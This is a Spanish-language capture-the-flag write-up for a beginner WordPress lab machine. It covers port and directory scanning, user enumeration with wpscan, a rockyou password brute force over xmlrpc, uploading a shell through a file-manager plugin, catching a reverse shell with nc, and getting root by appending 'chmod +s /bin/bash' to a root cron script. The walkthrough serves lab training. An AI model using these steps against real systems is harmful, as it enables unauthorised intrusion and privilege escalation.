# Academia

Máquina de nivel principiante construida sobre WordPress. IP: `192.168.100.157`

## 1. Reconocimiento

Como primer paso realizamos el escaneo de puertos y servicios con `nmap`:

```
nmap -sV 192.168.100.157
```

![[Pasted image 20260921194348.png]]

El host (`academy.thl`) tiene dos puertos abiertos:

- **22/tcp** → OpenSSH 9.2p1 Debian.
- **80/tcp** → Apache httpd 2.4.59 (Debian).

## 2. Enumeración web

Al visitar el puerto 80 en el navegador vemos la página por defecto de Apache2 en Debian, así que seguimos buscando contenido oculto:

![[Pasted image 20260921194929.png]]

Lanzamos una enumeración de directorios con `gobuster`:

```
gobuster dir -u http://192.168.100.157/wordpress -w /usr/share/wordlists/dirb/common.txt -t 50 -x ,.php
```

![[Pasted image 20260921195021.png]]

`gobuster` encuentra un directorio `/wordpress/` con un `index.php` que redirige con un 301. Al abrirlo confirmamos que se trata de un sitio web hecho en WordPress, «Mi Web No Hackeable»:

![[Pasted image 20260921195243.png]]

## 3. Enumeración de usuarios con wpscan

Con la instalación de WordPress localizada, enumeramos sus usuarios con `wpscan`:

```
wpscan --url http://192.168.100.157/wordpress -e u
```

![[Pasted image 20260921200119.png]]

El escaneo nos da bastante información útil:

- WordPress **6.5.3** (identificado como inseguro).
- `xmlrpc.php` habilitado.
- Directorio de subidas con listado activo (`wp-content/uploads/`).
- `wp-cron.php` externo habilitado.
- Enumeración de usuarios: encontramos el usuario **`dylan`** (mediante fuerza bruta de Author IDs).

## 4. Fuerza bruta con rockyou

Con el usuario en mano, realizamos el ataque de fuerza bruta con `wpscan` y el diccionario `rockyou.txt`:

```
wpscan --url http://192.168.100.157/wordpress -e u --passwords /usr/share/wordlists/rockyou.txt .php,.txt
```

![[Pasted image 20260921200934.png]]

El ataque de contraseñas se realiza contra `xmlrpc.php` y en segundos aparece la combinación válida:

```
dylan / password1
```

## 5. Subida de plugin malicioso

Con esas credenciales entramos al panel de administración. El sitio tiene instalado el plugin **Bit File Manager**, que nos permite explorar y subir archivos al servidor:

![[Pasted image 20260921203322.png]]

Desde ahí subimos un archivo malicioso (un plugin/shell) y nos ponemos en escucha con `nc` para recibir la reverse shell:

```
nc -lvnp 443
```

![[Pasted image 20260921205936.png]]

Al ejecutar el archivo subido, recibimos la conexión: shells como `www-data` (uid=33) en el host `debian` (kernel 6.1.0-9-amd64).

## 6. Terminal interactiva

La reverse shell que tenemos no es interactiva: no hay TTY, no funcionan los atajos de teclado ni el borrado de línea. La estabilizamos en cuatro pasos:

**Paso 1.** Damos estilo de shell completa con `script`, que asigna un TTY al proceso:

```
SHELL=/bin/bash script -q /dev/null
```

**Paso 2.** Pulsamos `Ctrl+Z` para enviar la shell al segundo plano (deja de responder pero sigue viva en nuestra máquina).

**Paso 3.** En nuestra terminal local configuramos la línea en modo crudo sin eco y recuperamos el proceso en primer plano:

```
stty raw -echo && fg
```

**Paso 4.** Exportamos la variable `TERM` para que la sesión remota sepa qué tipo de terminal es. Así funcionan atajos como `Ctrl+L` (limpiar pantalla) y el borrado de línea con `Backspace`:

```
export TERM=xterm
```

Con esto ya tenemos una shell cómoda y estable para seguir.

## 7. Enumeración de procesos con pspy64

Ahora buscamos si hay algún proceso o tarea programada que podamos aprovechar. Descargamos `pspy64`, un binario que muestra los procesos del sistema sin necesidad de permisos de root:

```
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
```

Lo ejecutamos (en segundo plano si queremos seguir trabajando en la shell) y observamos la salida:

![[Pasted image 20260921211654.png]]

Vemos que cada minuto se ejecuta `/opt/backup.sh` con `CRON`, corriendo como **UID=0 (root)**. Ese script pasa por alto la comprobación de que su propietario no ha cambiado, así que el comando que contiene se ejecuta siempre con privilegios de root.

## 8. Escalada de privilegios

Como el usuario `www-data` tiene permisos de escritura sobre `/opt`, basta con dejar nuestro propio comando dentro de `backup.sh`: cada vez que root lo ejecute, también ejecutará lo nuestro.

```
echo "chmod +s /bin/bash" >> /opt/backup.sh
chmod +x /opt/backup.sh
```

El comando añadido otorga el bit SUID al binario bash. Después de esperar a que el cron automatizado ejecute el script:

```
ls -l /bin/bash
/bin/bash -p
```

`ls -l` confirma el bit `-s` (SUID) en `/bin/bash` y con `bash -p` obtenemos una shell como root.

## 9. Banderas

Con la shell de root capturamos las banderas. Primero la del usuario (`/home/debian/user.txt`):

```
cd /home/
cd debian/
ls
cat user.txt
```

![[Pasted image 20260921212214.png]]

Y por último la bandera de root (`/root/root.txt`):

```
cat root.txt
```

![[Pasted image 20260921212143.png]]
